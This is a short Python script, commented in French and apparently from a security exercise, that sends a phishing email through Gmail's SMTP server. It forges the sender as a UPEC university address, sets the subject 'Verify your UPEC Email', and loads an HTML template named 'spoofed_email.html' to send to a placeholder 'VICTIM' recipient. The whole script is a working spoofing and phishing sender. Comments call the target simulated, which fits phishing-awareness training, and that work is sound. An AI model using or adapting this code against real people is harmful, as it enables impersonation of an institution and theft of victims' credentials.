import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# --- Configuration des adresses ---
msg = MIMEMultipart('alternative')
msg['From'] = 'spoofed@u-pec.fr'  # adresse apparente, visible pour la victime
msg['To'] = 'VICTIM @MAIL'  # cible simulée
msg['Subject'] = 'Verify your UPEC Email'

# --- Lire le contenu HTML de l'e-mail ---
with open('../email_templates/spoofed_email.html', 'r', encoding='utf-8') as f:
    html = f.read()

msg.attach(MIMEText(html, 'html'))

# --- Connexion SMTP Gmail ---
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)

# Ton compte Gmail réel
sender_email = 'SENDER @MAIL'

# Mot de passe d’application (fourni manuellement ici pour le test)
app_password = 'SENDER @MAIL PASSWORD'

# Connexion et envoi
server.login(sender_email, app_password)
server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("✅ Email envoyé à VICTIM @MAIL")

